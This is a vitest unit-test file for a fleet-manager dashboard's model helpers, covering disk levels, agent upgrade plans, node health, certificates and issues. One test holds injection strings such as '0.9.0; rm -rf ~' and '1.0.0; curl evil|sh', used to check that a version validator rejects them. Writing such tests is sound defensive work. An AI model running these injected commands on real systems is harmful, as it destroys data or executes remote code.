import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { DesiredRevisionDetail, Issue, NodeDetail, NodeListItem, RolloutDetail } from '@/api/types';
import { DAY, HOUR, MIN } from '@/lib/format';
import { contract } from '../helpers/contracts';
import {
  DISK_CRIT, DISK_WARN, SEMVER, agentInfo, agentOutdated, certFlag, certText, commit, diskDetail, diskHot, diskLevel, diskOf, diskVolume, drift, errorCount, failuresFromIssues,
  fixSteps, fromDetail, fromList, health, isAttention, isOpen, issueBadge, issueKind, issueLevel, issueSection, issueState, issuesByNode, nodeRank, osText, patchIssue,
  recentDrift, revTitle, revisionDetail, rolloutDetail, scanOutcome, seenText, sortIssues, upgradePlan,
} from '@/lib/model';

const NOW = Date.parse('2026-10-25T14:30:00Z');
const ago = (d: number): string => new Date(NOW - d).toISOString();
beforeEach(() => { vi.useFakeTimers(); vi.setSystemTime(NOW); });
afterEach(() => vi.useRealTimers());

const base = { revoked: false, revokedAt: null, freshness: 'fresh' as const, enrolledAt: ago(DAY), lastContactAt: ago(10_000), currentRevision: null, counts: { pending: 0, applying: 0, succeeded: 3, failed: 0, superseded: 0 } };

describe('contract fixtures', () => {
  it('turns the GET nodes fixture into view models', () => {
    const page = contract<{ items: NodeListItem[] }>('nodes-page');
    const n = fromList(page.items[0]!);
    expect(n).toMatchObject({ alias: 'studio-mini', platform: 'macos', revoked: false, notAfter: '2026-10-30T09:00:00Z' });
    expect(n.counts).toEqual({ pending: 0, applying: 0, succeeded: 4, failed: 1, superseded: 0 });
    expect(n.disk).toMatchObject({ label: 'home', usedPercent: 92.3 });
    expect(n.agent).toMatchObject({ version: '0.8.0', outdated: true, os: { name: 'Fedora Linux', version: '44', kernel: null } });
    expect(osText(n)).toBe('Fedora Linux 44');
  });
  it('turns the GET nodes/{node} fixture into a detail view model', () => {
    const d = fromDetail(contract<NodeDetail>('node-detail'));
    expect(d.targets.length).toBeGreaterThan(0);
    expect(d.credential).not.toBeNull();
    expect(d.currentRevision).toBe(d.targets.map(t => t.desiredRevision).filter(Boolean).sort((a, b) => Date.parse(b!.acceptedAt) - Date.parse(a!.acceptedAt))[0]!.sourceRevision);
    expect(d.disk?.volumes.length).toBeGreaterThan(0);
    expect(Array.isArray(d.drift)).toBe(true);
  });
  it('reads the revision and rollout fixtures', () => {
    const r = revisionDetail(contract<DesiredRevisionDetail>('desired-revision'));
    expect(r).toMatchObject({ id: '00000000-0000-0000-0000-0000000000d1', rolloutId: '00000000-0000-0000-0000-0000000000f1' });
    expect(r.skills).toEqual({ added: ['incident-runbook'], changed: ['release-notes'], removed: ['old-checklist'] });
    expect(r.previous?.id).toBe('00000000-0000-0000-0000-0000000000d0');
    expect(revTitle({ sourceRevision: r.sourceRevision, commit: { subject: 'Add incident-runbook skill', author: 'Joan', committedAt: '' } })).toBe('Add incident-runbook skill');
    const ro = rolloutDetail(contract<RolloutDetail>('rollout'));
    expect(ro.nodes[0]).toMatchObject({ name: 'studio-mini', state: 'failed' });
    expect(ro.summary.failed).toBe(1);
  });
  it('reads the issues fixture', () => {
    const items = contract<{ items: Issue[] }>('issues').items;
    expect(items.map(i => issueState(i).key)).toContain('acknowledged');
    expect(items.map(i => issueState(i).key)).toContain('snoozed');
  });
});

describe('disk', () => {
  it('recomputes the percentage when the Server omits it', () => {
    expect(diskVolume({ label: 'home', usedBytes: 50, availableBytes: 50, totalBytes: 100 })?.usedPercent).toBe(50);
    expect(diskVolume({ label: 'home', usedBytes: 1, availableBytes: 0, totalBytes: 1 } as never)?.usedPercent).toBe(100);
    expect(diskVolume(null)).toBeNull();
    expect(diskVolume({ label: 'home', usedBytes: -5, availableBytes: 'x', totalBytes: undefined } as never)).toMatchObject({ usedBytes: 0, availableBytes: 0, totalBytes: 0, usedPercent: 0 });
  });
  it('orders volumes home before state', () => {
    const d = diskDetail({ measuredAt: null, refreshRequestedAt: null, volumes: [{ label: 'state', totalBytes: 1, usedBytes: 0, availableBytes: 1, usedPercent: 0 }, { label: 'home', totalBytes: 1, usedBytes: 0, availableBytes: 1, usedPercent: 0 }] });
    expect(d?.volumes.map(v => v.label)).toEqual(['home', 'state']);
    expect(diskDetail(undefined)).toBeNull();
    expect(diskDetail({ measuredAt: null, refreshRequestedAt: ago(1000), volumes: [] })?.volumes).toEqual([]);
  });
  it('uses the Server thresholds', () => {
    expect(DISK_WARN).toBe(85);
    expect(DISK_CRIT).toBe(95);
    expect(diskLevel(84.9).key).toBe('good');
    expect(diskLevel(85).key).toBe('warning');
    expect(diskLevel(94.9).key).toBe('warning');
    expect(diskLevel(95)).toMatchObject({ key: 'critical', label: 'Nearly full' });
    const hot = { revoked: false, disk: diskVolume({ label: 'home', usedPercent: 90, usedBytes: 9, availableBytes: 1, totalBytes: 10 }) };
    expect(diskHot(hot)).toBe(true);
    expect(diskOf({ ...hot, revoked: true })).toBeNull();
    expect(diskHot({ revoked: false, disk: null })).toBe(false);
  });
});

describe('agent', () => {
  it('normalises the agent report and tolerates blanks', () => {
    expect(agentInfo(null)).toBeNull();
    const a = agentInfo({ version: '0.9.0', outdated: false, os: { name: ' ', version: '15.1' }, arch: 'aarch64', hostname: null } as never);
    expect(a).toMatchObject({ version: '0.9.0', outdated: false, os: { name: null, version: '15.1', kernel: null } });
    expect(osText({ agent: a })).toBe('15.1');
    expect(osText({ agent: null })).toBeNull();
  });
  it('ignores an outdated Agent on a revoked machine', () => {
    const agent = agentInfo({ version: '0.8.0', outdated: true } as never);
    expect(agentOutdated({ agent, revoked: false })).toBe(true);
    expect(agentOutdated({ agent, revoked: true })).toBe(false);
  });
  it('plans an upgrade from the install method, and validates the tag', () => {
    const mk = (over: object) => ({ agent: agentInfo({ version: '0.8.0', latestVersion: '0.9.0', outdated: true, ...over } as never) });
    expect(upgradePlan({ agent: agentInfo({ version: '0.9.0', outdated: false } as never) })).toBeNull();
    expect(upgradePlan({ agent: null })).toBeNull();
    const brew = upgradePlan(mk({ installMethod: 'homebrew', serviceManager: 'launchd' }))!;
    expect(brew.method).toBe('homebrew');
    expect(brew.steps.map(s => s.cmd)).toEqual(['brew upgrade fleet-agent', 'brew services restart fleet-agent']);
    const cargo = upgradePlan(mk({ installMethod: 'cargo', serviceManager: 'launchd' }))!;
    expect(cargo.steps[0]!.cmd).toContain('--tag v0.9.0');
    expect(cargo.steps[1]!.cmd).toBe('launchctl kickstart -k "gui/$(id -u)/dev.fleet.agent"');
    const bin = upgradePlan(mk({ installMethod: 'binary', serviceManager: 'systemd' }))!;
    expect(bin.releaseUrl).toBe('https://github.com/jcarcaboso/fleet-manager/releases/tag/v0.9.0');
    expect(bin.steps[0]!.cmd).toBe('systemctl --user restart fleet-agent.service');
    const none = upgradePlan(mk({ installMethod: 'binary', serviceManager: 'none' }))!;
    expect(none.steps[0]!.cmd).toBeUndefined();
    expect(upgradePlan(mk({ installMethod: null }))!.method).toBeNull();
    // A managed Agent is installed into its service rather than restarted.
    const managed = upgradePlan(mk({ installMethod: 'managed', serviceManager: 'systemd' }))!;
    expect(managed.method).toBe('managed');
    expect(managed.steps.map(s => s.cmd)).toEqual(['brew upgrade fleet-agent', 'fleet-agent service install']);
    expect(managed.steps[0]!.text).toContain('v0.9.0');
    expect(managed.releaseUrl).toBe('https://github.com/jcarcaboso/fleet-manager/releases/tag/v0.9.0');
  });
  it('never puts an unvalidated version into a command', () => {
    expect(SEMVER.test('0.9.0')).toBe(true);
    expect(SEMVER.test('0.9.0-rc.1')).toBe(true);
    expect(SEMVER.test('0.9.0; rm -rf ~')).toBe(false);
    expect(SEMVER.test('0.9.0 $(id)')).toBe(false);
    const plan = upgradePlan({ agent: agentInfo({ version: '0.8.0', latestVersion: '1.0.0; curl evil|sh', outdated: true, installMethod: 'cargo', serviceManager: 'none' } as never) })!;
    expect(JSON.stringify(plan)).not.toContain('curl');
    expect(plan.steps[0]!.cmd).toBeUndefined();
    const bin = upgradePlan({ agent: agentInfo({ version: '0.8.0', latestVersion: '$(id)', outdated: true, installMethod: 'binary' } as never) })!;
    expect(bin.releaseUrl).toBeNull();
  });
  it('puts the own action first for outdated Agents only', () => {
    const cat = { fix: ['Step A', 'Own action', 'Step B'] };
    expect(fixSteps({ action: 'Own action', code: 'agent_outdated' }, cat).map(s => s.t)).toEqual(['Own action', 'Step A', 'Step B']);
    expect(fixSteps({ action: 'Own action', code: 'other' }, cat).map(s => s.t)).toEqual(['Step A', 'Own action', 'Step B']);
    expect(fixSteps({ action: 'Own action', code: 'other' }, null).map(s => s.t)).toEqual(['Own action']);
    expect(fixSteps({ action: '', code: 'x' }, { fix: [] })).toEqual([]);
  });
});

describe('health', () => {
  const title = (c: string | null): string => (c ? `Title of ${c}` : 'Unknown problem');
  it('retired for a revoked machine', () => {
    expect(health({ ...base, revoked: true, revokedAt: ago(2 * DAY) }, [], title)).toMatchObject({ key: 'retired', reason: 'Revoked 2 d ago. Its alias stays reserved.' });
  });
  it('failing uses the catalog title and counts the rest', () => {
    const one = health({ ...base, counts: { ...base.counts, failed: 1 } }, [{ target: { name: 'skills' }, errorCode: 'lock_failed' }], title);
    expect(one).toMatchObject({ key: 'failing', label: 'Action needed', reason: 'Title of lock_failed', extra: null });
    const same = health({ ...base, counts: { ...base.counts, failed: 2 } }, [{ target: { name: 'skills' }, errorCode: 'x' }, { target: { name: 'ai-client/claude' }, errorCode: 'x' }], title);
    expect(same.extra).toBe('affects Skills and Claude');
    const mixed = health({ ...base, counts: { ...base.counts, failed: 2 } }, [{ target: { name: 'skills' }, errorCode: 'x' }, { target: { name: 'ai-client/claude' }, errorCode: 'y' }], title);
    expect(mixed.extra).toBe('+1 more');
    expect(health({ ...base, counts: { ...base.counts, failed: 3 } }, [], title).reason).toBe('3 Targets failing');
    expect(isAttention(one)).toBe(true);
  });
  it('offline, never contacted, updating, ok', () => {
    expect(health({ ...base, freshness: 'never_contacted', lastContactAt: null }, [], title)).toMatchObject({ key: 'never', label: 'Not checked in', reason: 'Enrolled 1 d ago, but the Agent has not checked in yet' });
    expect(health({ ...base, freshness: 'stale', lastContactAt: ago(3 * HOUR + 12 * MIN) }, [], title)).toMatchObject({ key: 'offline', reason: 'No check-in for 3 h 12 min' });
    const applying = health({ ...base, counts: { ...base.counts, applying: 2 }, currentRevision: 'a3f9c21d0c' }, [], title);
    expect(applying).toMatchObject({ key: 'updating', reason: 'Applying revision a3f9c21 to 2 Targets' });
    expect(health({ ...base, counts: { ...base.counts, pending: 1, succeeded: 0 } }, [], title).reason).toBe('1 Target waiting for the next check-in');
    expect(health({ ...base, currentRevision: 'a3f9c21d0c' }, [], title)).toMatchObject({ key: 'ok', reason: 'In sync at revision a3f9c21' });
    expect(health({ ...base, counts: { pending: 0, applying: 0, succeeded: 0, failed: 0, superseded: 0 } }, [], title).reason).toBe('No Targets are assigned yet');
    expect(isAttention(health(base, [], title))).toBe(false);
    expect(health({ ...base, counts: { ...base.counts, failed: 1 } }).reason).toBe('1 Target failing');
  });
  it('says when a machine was last seen', () => {
    expect(seenText({ revoked: true, lastContactAt: null })).toBe('Revoked');
    expect(seenText({ revoked: false, lastContactAt: null })).toBe('Never seen');
    expect(seenText({ revoked: false, lastContactAt: ago(5 * MIN) })).toBe('Seen 5 min ago');
  });
});

describe('certificates', () => {
  it('describes the time left', () => {
    expect(certText({ revoked: true, notAfter: null })).toBe('Revoked');
    expect(certText({ revoked: false, notAfter: null })).toBe('Unknown');
    expect(certText({ revoked: false, notAfter: new Date(NOW - 1).toISOString() })).toBe('Expired');
    expect(certText({ revoked: false, notAfter: new Date(NOW + 2 * DAY).toISOString() })).toBe('2 d left');
  });
  it('flags only certificates that an offline Agent cannot renew', () => {
    const soon = new Date(NOW + 5 * HOUR).toISOString();
    expect(certFlag({ revoked: false, freshness: 'fresh', notAfter: soon })).toBeNull();
    expect(certFlag({ revoked: true, freshness: 'stale', notAfter: soon })).toBeNull();
    expect(certFlag({ revoked: false, freshness: 'stale', notAfter: new Date(NOW + 3 * DAY).toISOString() })).toBeNull();
    expect(certFlag({ revoked: false, freshness: 'stale', notAfter: soon })?.text).toBe('Certificate expires in 5 h');
    expect(certFlag({ revoked: false, freshness: 'stale', notAfter: new Date(NOW - 1000).toISOString() })?.text).toMatch(/expired/);
    expect(certFlag({ revoked: false, freshness: 'stale', notAfter: null })).toBeNull();
  });
});

describe('issues', () => {
  const issue = (over: Partial<Issue>): Issue => ({
    id: 'x', code: 'assignment_failed', severity: 'error', title: '', detail: '', action: '', section: 'nodes', errorCode: null, nodeId: null, nodeName: null, target: null, since: null, commands: [], ...over,
  });
  it('levels, kinds and badges', () => {
    expect(issueLevel(issue({}))).toBe('critical');
    expect(issueLevel(issue({ severity: 'warning', code: 'node_not_contacting' }))).toBe('serious');
    expect(issueLevel(issue({ severity: 'warning', code: 'agent_outdated' }))).toBe('warning');
    expect(issueKind('serious')).toBe('moon');
    expect(issueBadge('critical')).toBe('Error');
    expect(issueBadge('serious')).toBe('Offline');
  });
  it('sorts by level, machine and target', () => {
    const a = issue({ id: 'a', severity: 'warning', code: 'agent_outdated', nodeName: 'a' });
    const b = issue({ id: 'b', nodeName: 'b', target: 'skills' });
    const c = issue({ id: 'c', nodeName: 'a', target: 'skills' });
    const d = issue({ id: 'd', severity: 'warning', code: 'node_not_contacting', nodeName: 'z' });
    expect(sortIssues([a, b, c, d]).map(i => i.id)).toEqual(['c', 'b', 'd', 'a']);
  });
  it('groups by machine and builds failures', () => {
    const list = [issue({ id: '1', nodeId: 'n1', target: 'skills', errorCode: 'lock_failed' }), issue({ id: '2', nodeId: 'n1' }), issue({ id: '3', nodeId: null })];
    const map = issuesByNode(list);
    expect([...map.keys()]).toEqual(['n1']);
    expect(map.get('n1')).toHaveLength(2);
    expect(failuresFromIssues(map.get('n1'))).toEqual([{ target: { name: 'skills' }, errorCode: 'lock_failed', issue: list[0] }]);
    expect(failuresFromIssues(null)).toEqual([]);
  });
  it('assigns sections', () => {
    expect(issueSection(issue({ nodeId: 'n' }))).toBe('machines');
    expect(issueSection(issue({ code: 'source_sync_failed', section: 'repository' }))).toBe('repository');
    expect(issueSection(issue({ code: 'cliproxy_refresh_failed', section: 'models' }))).toBe('models');
    expect(issueSection(issue({ code: 'weird', section: 'misc' }))).toBe('other');
  });
  it('derives the state, and a passed snooze counts as open', () => {
    expect(issueState(issue({})).key).toBe('open');
    expect(issueState(null).key).toBe('open');
    expect(issueState(issue({ state: 'acknowledged', stateBy: 'ana', stateAt: ago(HOUR) }))).toEqual({ key: 'acknowledged', by: 'ana', at: ago(HOUR), until: null });
    const future = new Date(NOW + HOUR).toISOString();
    expect(issueState(issue({ state: 'snoozed', snoozedUntil: future })).key).toBe('snoozed');
    expect(issueState(issue({ state: 'snoozed', snoozedUntil: ago(1) })).key).toBe('open');
    expect(issueState(issue({ state: 'snoozed', snoozedUntil: null })).key).toBe('snoozed');
    expect(isOpen(issue({ state: 'snoozed', snoozedUntil: ago(1) }))).toBe(true);
  });
  it('counts only open errors for the badge', () => {
    const items = [issue({}), issue({ id: '2', state: 'acknowledged' }), issue({ id: '3', severity: 'warning' }), issue({ id: '4', state: 'snoozed', snoozedUntil: ago(1) })];
    expect(errorCount(items)).toBe(2);
    expect(errorCount(null)).toBe(0);
  });
  it('patches an issue in a list', () => {
    const list = [issue({ id: 'a' }), issue({ id: 'b' })];
    const patched = patchIssue(list, issue({ id: 'b', state: 'acknowledged' }));
    expect(patched[1]!.state).toBe('acknowledged');
    expect(patched[0]).toBe(list[0]);
    expect(patchIssue(null, list[0]!)).toEqual([]);
  });
});

describe('phase 4', () => {
  it('reads commit metadata', () => {
    expect(commit(null)).toBeNull();
    expect(commit({ subject: ' ', author: '' })).toBeNull();
    expect(commit({ subject: 'Fix', author: 'Joan', committedAt: '2026-01-01T00:00:00Z' })).toEqual({ subject: 'Fix', author: 'Joan', committedAt: '2026-01-01T00:00:00Z' });
    expect(revTitle({ sourceRevision: 'a3f9c21d', commit: null })).toBe('Revision a3f9c21');
    expect(revTitle(null)).toBe('');
  });
  it('sanitises a revision diff', () => {
    const r = revisionDetail({ desiredRevisionId: 'r', sourceRevision: 's', acceptedAt: 'a', commit: null, previous: { desiredRevisionId: '', sourceRevision: '' }, rolloutId: null, skills: { added: ['a', 5 as never], changed: null as never, removed: [] }, targets: { added: -1, changed: '3' as never, removed: 0, nodes: 2.7 } });
    expect(r.skills).toEqual({ added: ['a'], changed: [], removed: [] });
    expect(r.targets).toEqual({ added: 0, changed: 3, removed: 0, nodes: 2 });
    expect(r.previous).toBeNull();
  });
  it('ranks Node states worst first', () => {
    expect(['succeeded', 'failed', 'pending', 'weird', 'applying'].sort((a, b) => nodeRank(a) - nodeRank(b))).toEqual(['failed', 'applying', 'pending', 'succeeded', 'weird']);
  });
  it('sorts drift newest first and drops invalid events; recent drift is the last day', () => {
    const events = drift([{ target: 'skills', files: ['a', 1], detectedAt: ago(3 * HOUR) }, { target: 't', files: [], detectedAt: 'bad' }, { target: 'skills', files: ['b'], detectedAt: ago(30 * MIN) }]);
    expect(events.map(e => e.files)).toEqual([['b'], ['a']]);
    expect(drift(undefined)).toEqual([]);
    const withOld = [...events, { target: 'skills', files: ['c'], detectedAt: ago(2 * DAY) }];
    expect(recentDrift({ drift: withOld })).toHaveLength(2);
  });
  it('names scan outcomes', () => {
    expect(scanOutcome('accepted').label).toBe('Published');
    expect(scanOutcome('failed')).toMatchObject({ level: 'critical', label: 'Fetch failed' });
    expect(scanOutcome('some_new_one').label).toBe('some new one');
    expect(scanOutcome(null).label).toBe('Unknown');
  });
});
